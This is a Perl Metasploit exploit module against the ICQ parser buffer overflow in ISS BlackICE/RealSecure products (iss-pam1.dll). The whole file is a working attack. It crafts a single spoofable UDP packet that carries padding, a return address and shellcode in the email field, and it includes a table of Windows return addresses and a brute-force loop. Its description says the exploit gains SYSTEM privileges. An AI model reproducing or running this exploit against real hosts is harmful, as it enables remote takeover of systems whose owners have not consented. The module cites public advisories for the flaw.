package Msf::Exploit::blackice_pam_icq;
use base 'Msf::Exploit';
use strict;
use Pex::Utils;

my $advanced = {
  'BruteWait'       => [5, 'Time to sleep between attempts, gives the SEH a chance to recover.'],
  'AdvancedTargets' => [0, 'You should never really need this, just figured why not. This won\'t work with brute forcing either.'],
};

my $info =
{
  'Name'  => 'Blackice/RealSecure/Other ISS ICQ Parser Buffer Overflow',
  'Version'  => '$Revision: 1.13 $',
  'Authors' =>
    [
      'spoonm <ninjatools [at] hush.com>',
    ],
  'Description'  => qq{

    This is a bug in the (seemingly unused) ICQ parser in ISS products that use
    iss-pam1.dll.  It is a stack overflow caused by _sprintf()'s based on
    information from a META_USER packet.  This exploit requires only 1 udp packet
    to be sent, no state required.  This means you can spoof, or fire at broadcasts.
    The ISS products seem to have an interesting exception handler installed that
    will recover the process if something bad happens, which gives us the ability
    to not only compromise the process multiple times, but also to brute force.
    !!! winexec payload's will not working, blackd is running as a system service
    and seems to have some problems with winexec that we have yet to figure out !!!
    Oh, and yeah, this gets you SYSTEM.

  },
  
  'Arch'  => [ 'x86' ],
  'OS'    => [ 'win32' ],
  'Priv'  => 1,
  'UserOpts'  =>
    {
      'RHOST' => [1, 'ADDR', 'The target address'],
      'RPORT' => [1, 'PORT', 'The target port (1 for random)', 1],
    },

  'Payload' =>
    {
      'Space'  => 504 - 31 - 4,
      'BadChars'  => "\x00",
      'MinNops' => 0,
      'MaxNops' => 0,
      'PrependEncoder' => "\x83\xc4\x84", # add esp, BYTE -124
#      'Prepend' => "\xcc",
    },

  'Refs'  => 
    [  
      'http://www.osvdb.org/4355',
      'http://www.eeye.com/html/Research/Advisories/AD20040318.html',
      'http://xforce.iss.net/xforce/alerts/id/166',
    ],
  'DefaultTarget' => -1, # it defaults to this, but set anyway
  'Targets' =>
    [
      [1, 'Brute Force All', 3 .. 12],
      [1, 'Brute Force iss-pam1.dll', 3 .. 4],
      [1, 'Brute Force nt4', 11 .. 12],
      [1, 'iss-pam1.dll 3.6.06', 0x5e0a473f],
      [1, 'iss-pam1.dll 3.6.11', 0x5e0da1db],

      [1, 'WinXP SP0 - SP1', 0x71aa3a4b], # ws2help.dll

      [1, 'Win2k3 SP0', 0x71bf3cc9], # ws2help.dll

# ey4s rocks, thanks for the ret man!
      [1, 'Win2000 SP0 - SP4', 0x750231e2], # ws2help.dll

      [1, 'WinNT SP3 / WinNT SP5 / WinNT SP6', 0x777e79ab], # samlib.dll
      [1, 'WinNT SP4 / WinNT SP5', 0x7733b8db], # cfgmgr32.dll

# I love opcode db.
 
      [0, 'WinXP SP0 / WinXP SP1 - shell32.dll', 0x776606af], # shell32.dll
      [0, 'WinXP SP0 / WinXP SP1 - atl.dll', 0x76b305a7], # atl.dll
      [0, 'WinXP SP0 / WinXP SP1 - atl.dll', 0x76e61a21], # activeds.dll
      [0, 'WinXP SP0 / WinXP SP1 - ws2_32.dll', 0x71ab7bfb], # ws2_32.dll
      [0, 'WinXP SP0 / WinXP SP1 - mswsock.dll', 0x71a5403d], # mswsock.dll

      [0, 'Win2000 SP2 / Win2000 SP3 - samlib.dll', 0x75159da3], # samlib.dll
      [0, 'Win2000 SP0 / Win2000 SP1 - activeds.dll', 0x773d0beb], # activeds.dll


      [0, 'WinNT SP5 / WinNT SP6 - advapi32.dll', 0x77dcd1cb], # advapi32.dll
      [0, 'WinNT SP3 / WinNT SP5 / WinNT SP6 - shell32.dll', 0x77cec080], # shell32.dll
      [0, 'WinNT SP5 / WinNT SP6 - mswsock.dll', 0x7767ebca], # mswsock.dll
    ],
};

# Override to do our advanced target foo
sub Targets {
  my $self = shift;
  my $targets = $self->SUPER::Targets;
  my $newTargets = [ ];
  my $advanced = !$self->GetLocal('AdvancedTargets') == 1;

  foreach my $target (@{$targets}) {
    if($target->[0] >= $advanced) {
      my @target = @{$target};
      shift(@target);
      push(@{$newTargets}, \@target);
    }
  }
  return($newTargets);
}

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}


sub Exploit {
  my $self = shift;
  my $targetHost  = $self->GetVar('RHOST');
  my $targetIndex = $self->GetVar('TARGET');
  my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

  # Pad shellcode to size
  $shellcode .= Pex::Utils::EnglishText($self->PayloadSpace - length($shellcode));

  my $target = $self->Targets->[$targetIndex];

  $self->PrintLine;
  $self->PrintLine('[*] !!! Note: The connection will not close after shellcode is finished');
  $self->PrintLine('              (atleast when using SEH).  This is because the SEH handler');
  $self->PrintLine('              recovers after bad exceptions (good for us).');
  $self->PrintLine;


  my @targets;

  if(@{$target} == 2) {
    @targets = ($targetIndex);
  }
  else {
    @targets = @{$target};
    my $name = shift(@targets);
    $self->PrintLine('[*] Trying Multiple Targets - ' . $name);
  }

  foreach $targetIndex (@targets) {
    my $target = $self->Targets->[$targetIndex];
    my $addr = $target->[1];

    $self->PrintLine(sprintf('[*] Trying %s - 0x%08x', $target->[0], $addr));

    my $sock = Msf::Socket->new;
    my $port = $self->_targetPort;
    if(!$sock->Udp($targetHost, $port, 4000) || $sock->IsError) {
      $sock->PrintError;
      return;
    }


# http://www.cs.berkeley.edu/~mikechen/im/protocols/icq/icqv5.html
# ISS's parser disagrees with both the above protocol and ethereal's disector

# God I'm so sick of this exploit by now, heh.
# ISS's parser seems totally broked, so this protocol is a fudge of the real one.
  
    my $header = Pex::Struct->new(
      [
        'version'   => 'l_u_16',
        'unknown0'  => 'u_8',
        'sessionId' => 'l_u_32',
        'command'   => 'l_u_16',
        'seqnum1'   => 'l_u_16',
        'seqnum2'   => 'l_u_16',
        'uin'       => 'l_u_32',
        'checkcode' => 'l_u_32',
      ]
    );

    $header->Set(
      'version'   => 5,
      'unknown0'  => 0,
      'sessionId' => 0,
      'command'   => 530, # SRV_MULTI
      'seqnum1'   => 0,
      'seqnum2'   => 0,
      'uin'       => 1161044754,
#      'uin'       => 0,
      'checkcode' => 0,
    );


    # Packet 1 USER_ONLINE
    my $userOnline = Pex::Struct->new(
      [
        'header'    => 'struct',
        'uinOnline' => 'l_u_32',
        'ip'        => 'l_u_32',
        'port'      => 'l_u_32',
        'realIp'    => 'l_u_32',
        'unknown1'  => 'u_8',
        'status'    => 'l_u_32',
        'unknown2'  => 'l_u_32',
      ],
    );


    my $headerOnline = $header->copy;
    $headerOnline->Set('command', 110); # SRV_USER_ONLINE

    $userOnline->Set(
      'header' => $headerOnline,
      'uinOnline' => 1161044754,
      'ip'        => 1,
      'port'      => 0,
      'realIp'    => 0,
      'unknown1'  => 0,
      'status'    => 0,
      'unknown2'  => 0,
    );

    # Packet 2 META_USER
    my $metaUser = Pex::Struct->new(
      [
        'header'          => 'struct',
        'subcommand'      => 'l_u_16',
        'success'         => 'u_8',
        'nickLength'      => 'l_u_16',
        'nick'            => 'string',
        'firstNameLength' => 'l_u_16',
        'firstName'       => 'string',
        'lastNameLength'  => 'l_u_16',
        'lastName'        => 'string',
        'emailLength'     => 'l_u_16',
        'email'           => 'string',
        'authorize'       => 'u_8',
        'unknown1'        => 'l_u_16',
        'unknown2'        => 'l_u_32',
      ],
    );

    my $headerMeta = $header->copy;
    $headerMeta->Set('command', 990); # SRV_META_USER
    $headerMeta->Set('uin', 2018915346);

    # Evilness
  
    my $nick = '';
    my $firstName = '';
    my $lastName = '';
  
#    my $email = 'A' x 19;
    my $email = Pex::Utils::EnglishText(19);
    $email .= pack('V', $addr);
    $email .= $shellcode;


    $metaUser->SetSizeField(
      'nick'      => 'nickLength',
      'firstName' => 'firstNameLength',
      'lastName'  => 'lastNameLength',
      'email'     => 'emailLength',
    );

    $metaUser->Set(
      'header'          => $headerMeta,
      'subcommand'      => 0, # META_USER_FOUND (Should be 410, iss, wtf?)
      'success'         => 10, # Success
      'nick'            => $nick,
      'firstName'       => $firstName,
      'lastName'        => $lastName,
      'email'           => $email,
      'authorize'       => 0, # don't ask permission (docs and ethereal conflict)
      'unknown1'        => 0,
      'unknown2'        => 0,
    );

    my $multi = Pex::Struct->new(
      [
        'header'        => 'struct',
        'numPackets'    => 'u_8',
        'packet1Length' => 'l_u_16',
        'packet1'       => 'struct',
        'packet2Length' => 'l_u_16',
        'packet2'       => 'struct',
      ],
    );

    $multi->Set(
      'packet2Length' => length($metaUser),
    );

    $multi->Set(
      'header'     => $header,
      'numPackets' => 2,
      'packet1Length' => $userOnline->Length,
      'packet1'       => $userOnline,
      'packet2Length' => $metaUser->Length,
      'packet2'       => $metaUser,
    );


    my $request = $multi->Fetch;

    $self->PrintLine('[*] Sending UDP Request (Dest Port: ' . $port . ') (' . length($request) . ' bytes)');
  
    $sock->Send($request);

    $self->PrintLine('[*] Sleeping (giving exception handle time to recover).');
    sleep($self->GetLocal('BruteWait'));
  }

}

sub _targetPort {
  my $self = shift;
  my $targetPort  = $self->GetVar('RPORT');
  return($targetPort) if($targetPort != 1);
  return(int(rand(65536 - 2000)) + 2000);
}


